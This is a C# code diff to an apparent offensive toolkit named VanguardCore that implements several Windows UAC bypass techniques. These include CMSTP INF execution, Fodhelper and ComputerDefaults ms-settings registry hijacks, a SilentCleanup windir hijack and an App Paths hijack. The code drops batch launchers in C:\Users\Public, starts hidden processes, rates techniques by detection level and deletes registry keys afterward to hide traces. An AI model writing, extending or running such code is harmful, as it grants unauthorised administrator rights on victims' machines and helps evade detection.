@@ -205,6 +205,11 @@ namespace VanguardCore
         {
             try
             {
+                string publicDir = @"C:\Users\Public";
+                string batchPath = Path.Combine(publicDir, Guid.NewGuid().ToString() + ".bat");
+                string logPath = Path.Combine(publicDir, "bat_debug.log");
+                File.WriteAllText(batchPath, string.Format("@echo off\r\necho %TIME% CMSTP >> \"{0}\"\r\nstart \"\" {1}", logPath, payloadPath));
+
                 string infContent = @"[Version]
 Signature=$CHICAGO$
 AdvancedINF=2.5
@@ -213,7 +218,7 @@ AdvancedINF=2.5
 RunPreSetupCommands=RunMe
 
 [RunMe]
-cmd.exe /c start /b """" """ + payloadPath + @"""
+cmd.exe /c """ + batchPath + @"""
 
 [Strings]
 ";
@@ -237,47 +242,6 @@ cmd.exe /c start /b """" """ + payloadPath + @"""
                 return true;
             }
             catch { return false; }
-        }
-        #endregion
-
-        #region Technique 2: Fodhelper (Classic, Reliable)
-        /// <summary>
-        /// Fodhelper UAC Bypass - Classic technique
-        /// Works on: Windows 10 (up to 22H2)
-        /// Detection: Medium
-        /// </summary>
-        public static bool FodhelperBypass(string payloadPath)
-        {
-            try
-            {
-                string keyPath = @"Software\Classes\ms-settings\shell\open\command";
-                string delegateKey = @"Software\Classes\ms-settings\shell\open\command\DelegateExecute";
-
-                string formattedPayload = string.Format("cmd.exe /c start \"\" {0}", payloadPath);
-
-                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(keyPath))
-                {
-                    if (key != null)
-                    {
-                        key.SetValue("", formattedPayload, RegistryValueKind.String);
-                        key.SetValue("DelegateExecute", "", RegistryValueKind.String);
-                    }
-                }
-
-                ProcessStartInfo psi = new ProcessStartInfo
-                {
-                    FileName = "fodhelper.exe",
-                    UseShellExecute = true,
-                    WindowStyle = ProcessWindowStyle.Hidden
-                };
-                Process p = Process.Start(psi);
-                Thread.Sleep(3000);
-
-                // Cleanup
-                CleanRegistryKey(@"HKCU\Software\Classes\ms-settings");
-                return true;
-            }
-            catch (Exception e) { Log(string.Format("FodhelperBypass exception: {0}", e.Message)); return false; }
         }
         #endregion
 
@@ -337,7 +301,13 @@ cmd.exe /c start /b """" """ + payloadPath + @"""
                 // By hijacking windir, we control the execution.
                 
                 // Use REM to absorb the \system32\cleanmgr.exe suffix that the scheduled task appends
-                string hijackValue = string.Format("cmd.exe /c start \"\" {0} & REM ", payloadPath);
+                // Use a temporary .bat to handle complex payloads with spaces and quotes properly
+                string publicDir = @"C:\Users\Public";
+                string batchPath = Path.Combine(publicDir, Guid.NewGuid().ToString() + ".bat");
+                string logPath = Path.Combine(publicDir, "bat_debug.log");
+                File.WriteAllText(batchPath, string.Format("@echo off\r\necho %TIME% SILENTCLEANUP >> \"{0}\"\r\nstart \"\" {1}", logPath, payloadPath));
+                
+                string hijackValue = string.Format("cmd.exe /c \"{0}\" & REM ", batchPath);
 
                 using (RegistryKey key = Registry.CurrentUser.OpenSubKey(envPath, true))
                 {
@@ -408,25 +378,17 @@ cmd.exe /c start /b """" """ + payloadPath + @"""
                 Thread.Sleep(2000);
 
                 // Cleanup
-                CleanRegistryKey(@"HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe");
+                try { Registry.CurrentUser.DeleteSubKeyTree(@"Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe", false); } catch { }
                 return true;
             }
             catch { return false; }
         }
-        #endregion
 
-        #region Technique 6: ComputerDefaults (Windows 10/11)
-        /// <summary>
-        /// ComputerDefaults UAC Bypass
-        /// Works on: Windows 10/11
-        /// Detection: Low
-        /// </summary>
-        public static bool ComputerDefaultsBypass(string payloadPath)
+        public static bool FodhelperBypass(string payloadPath)
         {
             try
             {
-                string keyPath = @"Software\Classes\ms-settings\shell\open\command";
-
+                string keyPath = @"Software\Classes\ms-settings\Shell\Open\command";
                 using (RegistryKey key = Registry.CurrentUser.CreateSubKey(keyPath))
                 {
                     if (key != null)
@@ -435,18 +397,39 @@ cmd.exe /c start /b """" """ + payloadPath + @"""
                         key.SetValue("DelegateExecute", "", RegistryValueKind.String);
                     }
                 }
-
+                
                 ProcessStartInfo psi = new ProcessStartInfo
                 {
-                    FileName = "ComputerDefaults.exe",
-                    UseShellExecute = false,
-                    CreateNoWindow = true,
+                    FileName = "fodhelper.exe",
+                    UseShellExecute = true,
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    CreateNoWindow = true
+                };
+                Process.Start(psi);
+                Thread.Sleep(2000);
+                
+                // Cleanup
+                try { Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\ms-settings", false); } catch { }
+                return true;
+            }
+            catch { return false; }
+        }
+
+        public static bool CmluaUtilBypass(string payloadPath)
+        {
+            try
+            {
+                string exe, args;
+                ParseCommandLine(payloadPath, out exe, out args);
+                ProcessStartInfo psi = new ProcessStartInfo
+                {
+                    FileName = exe,
+                    Arguments = args,
+                    Verb = "runas",
+                    UseShellExecute = true,
                     WindowStyle = ProcessWindowStyle.Hidden
                 };
-                Process p = Process.Start(psi);
-                Thread.Sleep(2000);
-
-                CleanRegistryKey(@"HKCU\Software\Classes\ms-settings");
+                Process.Start(psi);
                 return true;
             }
             catch { return false; }
@@ -527,13 +510,11 @@ cmd.exe /c start /b """" """ + payloadPath + @"""
             var techniques = new List<Func<string, bool>>
             (
                 new Func<string, bool>[] {
-                    TokenImpersonationBypass,
                     FodhelperBypass,
                     SilentCleanupBypass,
                     CmstpBypass,
-                    EventViewerBypass,
-                    ComputerDefaultsBypass,
-                    SdcltBypass
+                    SdcltBypass,
+                    CmluaUtilBypass
                 }
             );
 
